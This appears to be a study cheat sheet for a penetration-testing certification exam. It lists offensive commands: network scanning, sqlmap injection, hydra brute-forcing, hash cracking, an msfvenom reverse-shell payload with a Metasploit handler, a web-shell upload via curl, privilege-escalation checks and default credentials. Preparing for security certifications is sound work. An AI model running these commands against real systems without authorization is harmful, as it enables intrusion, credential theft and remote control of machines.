

🔥 Top 10 Exam Commands (MUST KNOW)
1. **Network Scanning**

```
nmap -sS -p- -T4 10.10.10.10  # Stealth TCP scan
```

```
nmap -sU -p 53,161 10.10.10.10 # UDP scan
```

2. **Web App Attacks**

```
sqlmap -u "http://site.com?id=1" --risk=3 --level=5 --dbs
```

```
hydra -l admin -P rockyou.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:F=invalid"
```

3. **Password Cracking**

```
john --format=NT hashes.txt --wordlist=rockyou.txt
```

```
hashcat -m 1000 hashes.txt rockyou.txt --force
```

4. **Metasploit Essentials**

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe > payload.exe
```

```
use exploit/multi/handler
```

```
set payload windows/meterpreter/reverse_tcp
```

## 📌 Exam Task Quick Reference

### 1. Network Scanning
| Task                | Command                                                                 |
|---------------------|-------------------------------------------------------------------------|
| Find live hosts     | `nmap -sn 192.168.1.0/24`                                              |
| Full port scan      | `nmap -p- -T4 10.10.10.10`                                             |
| Service versions    | `nmap -sV -p 80,443 10.10.10.10`                                       |

### 2. Web Hacking
| Vulnerability      | Command                                                |
| ------------------ | ------------------------------------------------------ |
| SQL Injection      | `sqlmap -u "http://site.com?id=1" --dbs`               |
| XSS Test           | `<script>alert('XSS')</script>`                        |
| File Upload Bypass | `curl -F "file=@shell.php" http://site.com/upload.php` |

### 3. Privilege Escalation
| OS      | Command                                                   |
| ------- | --------------------------------------------------------- |
| Linux   | `sudo -l`, `find / -perm -4000 2>/dev/null`, `linpeas.sh` |
| Windows | `whoami /priv`, `systeminfo`, `winPEASany.exe`            |

## 🚨 Exam Day Pro Tips

1. **Time Management**:
   - Spend max **15-20 mins per task**
   - Flag difficult tasks and return later

1. **Documentation**:

   Take screenshots of EVERY step
   
```
import -window root screenshot_$(date +%s).png
```

3. **When Stuck**:

   - Check `/var/www/html` for web files
   - Try default creds (`admin:admin`, `root:toor`)



